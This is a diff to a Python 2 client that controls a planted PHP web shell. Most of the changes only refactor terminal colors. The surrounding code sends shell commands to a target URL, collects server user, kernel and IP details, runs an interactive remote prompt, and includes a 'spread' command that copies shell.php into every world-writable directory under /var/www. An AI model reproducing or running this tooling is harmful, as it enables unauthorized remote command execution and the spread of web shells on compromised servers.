@@ -22,6 +22,14 @@ except ImportError:
 else:
     pass
 
+class Colors:
+    RED = '\033[91m'
+    GREEN = '\033[92m'
+    BLUE = '\033[94m'
+    YELLOW = '\033[93m'
+    HOT = '\033[97m'
+    END = '\033[0m'
+
 class Commander(object):
     def __init__(self, url=None):
         self.url = url
@@ -33,7 +41,7 @@ class Commander(object):
     # defining static methods
     @staticmethod
     def banner():
-        return """\033[93m
+        return """%s
 \t\t __         ______   ______   .___  ___. .___  ___.      ___      .__   __.  _______
 \t\t|  |       /      | /  __  \  |   \/   | |   \/   |     /   \     |  \ |  | |       \\
 \t\t|  |      |  ,----'|  |  |  | |  \  /  | |  \  /  |    /  ^  \    |   \|  | |  .--.  |
@@ -41,7 +49,7 @@ class Commander(object):
 \t\t|  |      |  `----.|  `--'  | |  |  |  | |  |  |  |  /  _____  \  |  |\   | |  '--'  |
 \t\t|__|       \______| \______/  |__|  |__| |__|  |__| /__/     \__\ |__| \__| |_______/
 \t\t--------------------------------------------------------------------------------------
-        \033[0m"""
+        %s""" % (Colors.YELLOW, Colors.END)
 
     def ServerInfo(self):
         try:
@@ -58,17 +66,33 @@ class Commander(object):
         self.info = \
         '''
         %s
-        \033[91mUser\033[0m     :  \033[92m%s\033[0m
-        \033[91mID\033[0m       :  \033[92m%s\033[0m
-        \033[91mKernel\033[0m   :  \033[92m%s\033[0m
-        \033[91mCWD\033[0m      :  \033[92m%s\033[0m
-        \033[91mHost IPs\033[0m :  \033[92m%s\033[0m
-        \033[91mLocal IP\033[0m :  \033[92m%s\033[0m
+        %sUser%s     :  %s%s%s
+        %sID%s       :  %s%s%s
+        %sKernel%s   :  %s%s%s
+        %sCWD%s      :  %s%s%s
+        %sHost IPs%s :  %s%s%s
+        %sLocal IP%s :  %s%s%s
         %s
 
-        \033[97m[+] Available commands: %s.\033[0m
-        \033[97m[+] Inserting\033[0m \033[91m!\033[0m \033[97mat the begining of the command will execute it on your box.\033[0m
-        ''' % ('-'* int(len(source[2])+12), source[0], source[1], source[2], source[3], ', '.join(source[4:]), local_ip, '-'* int(len(source[2])+12), available_commands)
+        %s[+] Available commands: %s.%s
+        %s[+] Inserting%s %s!%s %sat the begining of the command will execute it on your box.%s
+        ''' % ('-'* int(len(source[2])+12),
+                Colors.RED, Colors.END,
+                Colors.GREEN, source[0], Colors.END,    # current user
+                Colors.RED, Colors.END,
+                Colors.GREEN, source[1], Colors.END,    # current ID
+                Colors.RED, Colors.END,
+                Colors.GREEN, source[2], Colors.END,    # kernel version
+                Colors.RED, Colors.END,
+                Colors.GREEN, source[3], Colors.END,    # CWD
+                Colors.RED, Colors.END,
+                Colors.GREEN, ', '.join(source[4:]), Colors.END,    # host ip
+                Colors.RED, Colors.END,
+                Colors.GREEN, local_ip, Colors.END,                 # local ip
+                '-'* int(len(source[2])+12),
+                Colors.HOT, available_commands, Colors.END,         # available commands
+                Colors.HOT, Colors.END, Colors.RED, Colors.END, Colors.HOT, Colors.END, # hint
+                )
         print self.info
 
     def BackConnect(self):
@@ -77,7 +101,10 @@ class Commander(object):
         while True:
             try:
                 try:
-                    command = quote(raw_input('%s\033[91m@\033[0m\033[92m%s\033[0m:~\033[93m(%s)\033[0m-$ ' % (self.source[0], self.source[4], self.source[3])))
+                    command = quote(raw_input('%s%s@%s%s%s%s:~%s(%s)%s-$ ' % (self.source[0],
+                        Colors.RED, Colors.END,
+                        Colors.GREEN, self.source[4], Colors.END,
+                        Colors.YELLOW, self.source[3], Colors.END)))
                 except IndexError:
                     command = raw_input('icommand\033[91m@\033[0m\033[92mserver:$ ')
                 history.append(quote(command))
@@ -98,8 +125,10 @@ class Commander(object):
                     elif command == 'writable':
                         self.cmd = quote("find /var/www/ -xdev -type d \( -perm -0002 -a ! -perm -1000 \) -print")
                         self.writeables = writeables = map(str.strip, urlopen('%s%s' % (self.url, self.cmd)).readlines())
+                        c = 1
                         for path in writeables:
-                            print path
+                            print '%2d- %s' % (c, path)
+                            c += 1
                     elif command == 'spread':
                         self.cmd = quote('find /var/www -xdev -type d \( -perm -0002 -a ! -perm -1000 \) | xargs -n 1 cp shell.php')
                         urlopen('%s%s' % (self.url, self.cmd))
